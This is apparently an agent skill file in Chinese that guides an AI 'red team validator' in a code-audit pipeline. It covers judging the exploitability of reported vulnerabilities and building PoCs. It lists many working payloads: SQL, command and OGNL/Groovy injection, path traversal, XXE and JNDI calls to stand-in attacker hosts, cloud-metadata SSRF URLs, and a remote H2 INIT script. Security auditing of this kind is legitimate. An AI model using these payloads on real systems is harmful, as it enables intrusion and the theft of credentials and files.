---
name: red-validator
description: 红队攻击验证专家运行时指导。当 RedValidator Agent 执行可利用性验证任务时加载，提供逐参数可控性分析方法、按漏洞类型的 PoC 构造快速参考和最大危害评估框架。
---

# RedValidator 运行时指导

## 角色职责
接收 ReverseTracer 或 LogicAuditor 输出的漏洞候选链路，验证可利用性，构造攻击向量和 PoC。

## 输入格式
接收上游 agent 的漏洞候选（JSON）：
```json
{
  "vuln_type": "SQL Injection",
  "entry_route": "POST /api/login",
  "filepath": "漏洞文件路径",
  "line_number": "42",
  "call_chain": ["1. Controller...", "2. Service...", "3. Sink..."],
  "suspicion_reason": "污点追踪发现..."
}
```

## 工作步骤

### 1. 逐参数可控性分析（最关键步骤）
- 列出 sink 调用中**每一个**动态参数
- 对每个参数，沿 `call_chain` 追溯其来源
- **只要有一个参数可被攻击者控制且未经有效过滤 → 整体判 EXPLOITABLE**
- 只有**所有**参数都被有效过滤才能判 NOT_EXPLOITABLE

常见反模式（必须避免）：
- 错判 NOT_EXPLOITABLE："username 被白名单限制" —— 但 password 仍可控
- 错判 NOT_EXPLOITABLE："前面有 if 判断" —— 但 if 只判断了部分变量
- 错判 NOT_EXPLOITABLE："需要登录" —— 已登录用户仍可利用

### 2. 构思攻击向量与 PoC

按 `vuln_type` 查阅 `shared-reference/INDEX.md` 找到对应文档，重点关注"PoC 模板"段落。
以下是各漏洞类型的快速参考：

**SQL Injection**
- 闭合引号：`' OR '1'='1`、`" OR "1"="1`
- UNION 提取：`' UNION SELECT password FROM users--`
- 盲注时间型：`' AND SLEEP(5)--`
- MyBatis `${}`：直接注入列名/表名
- MSSQL 堆叠查询：`; EXEC xp_cmdshell 'id'`

**Command Injection**
- shell 元字符：`; id`、`| id`、`&& id`、`$(id)`、`` `id` ``
- ProcessBuilder 单 argv：`-c` 参数注入或 PATH 劫持

**Code Injection（OGNL / MVEL / Groovy / JEXL）**
- OGNL：`@java.lang.Runtime@getRuntime().exec({'id'})`
- MVEL：`Runtime.getRuntime().exec("id")`
- Groovy：`"id".execute().text`
- JEXL：`''.getClass().forName('java.lang.Runtime').getMethod('exec',...).invoke(...)`
- Nashorn：`Java.type("java.lang.Runtime").getRuntime().exec("id")`

**Path Traversal / Zip Slip**
- Unix：`../../../etc/passwd`
- URL 双编码：`%2e%2e%2f`
- Windows：`\..\`
- UNC：`\\attacker\share`
- Zip Slip：ZipEntry 名含 `../../../etc/cron.d/malicious`

**XXE**
- 本地文件读取：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- 带外 SSRF：`<!ENTITY xxe SYSTEM "http://attacker/exfil?d=...">`（参数实体）

**SSRF**
- 内网探测：`http://127.0.0.1:8500/v1/catalog/services`（Consul）
- 云元数据：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- DNS rebinding：`*.nip.io` 或自建解析器

**LDAP Injection**：`*` 通配枚举、`)(objectclass=*` 闭合注入
**XPath Injection**：`' or '1'='1`、布尔盲注 `string-length(password)>5`
**Unsafe Deserialization**：Commons Collections `InvokerTransformer`、ROME `ToStringBean`、ysoserial 预制 payload
**JNDI Injection**：`ldap://attacker.com/Exploit`、`rmi://attacker.com/Exploit`
**JDBC URL Injection**：
  - MySQL：`jdbc:mysql://attacker/?allowLoadLocalInfile=true`（客户端任意文件读）
  - H2：`jdbc:h2:mem:;INIT=SCRIPT FROM 'http://attacker/e.sql'`（RCE）
**XSS**（按输出上下文）：
  - HTML body：`<script>alert(1)</script>`、`<img src=x onerror=alert(1)>`
  - HTML 属性：`" onmouseover="alert(1)`
  - JS 上下文：`';alert(1);//`
  - URL 属性：`javascript:alert(1)`
**Open Redirect**：`//attacker.com`、`https:attacker.com`、域名尾注入
**Unsafe Reflection**：`java.lang.Runtime` / `javax.naming.InitialContext` 作为 Class.forName 参数
**Trust Boundary Violation**：`/setPref?key=role&value=ADMIN` 写入 session
**Sensitive Data in Log/URL**：泄露即漏洞，`attack_vector` 写"通过中心化日志泄露"

### 3. 评估最大危害
- RCE：命令注入、代码注入、不安全反序列化、JNDI 注入
- 敏感数据泄露：SQL 注入 UNION、SSRF 读取内部服务、XXE 读取文件
- 认证绕过：SQL 注入绕过登录、硬编码后门
- 权限提升：IDOR、越权操作

## 输出规范

### EXPLOITABLE
必须包含全部字段：
```json
{
  "status": "EXPLOITABLE",
  "vuln_type": "【逐字复制输入的 vuln_type】",
  "entry_route": "复制",
  "filepath": "复制",
  "line_number": "复制",
  "call_chain": "复制",
  "suspicion_reason": "复制",
  "attack_vector": "攻击手法描述与绕过思路",
  "poc_payload": "具体的 PoC 请求体或触发参数",
  "max_impact": "最坏影响评估（如 RCE, Data Leak）"
}
```

### NOT_EXPLOITABLE
必须带 `defense_analysis`（≥20 字符），逐参数说明为何不可利用：
```json
{
  "status": "NOT_EXPLOITABLE",
  "defense_analysis": "逐参数说明：参数 A 被 X 过滤（第 N 行），参数 B 被 Y 过滤（第 M 行）..."
}
```

### 绝对禁止
- 禁止修改 `vuln_type`
- 禁止仅输出 `{"status": "NOT_EXPLOITABLE"}` 无 defense_analysis
- 禁止以"教学/演示项目"作为 NOT_EXPLOITABLE 理由
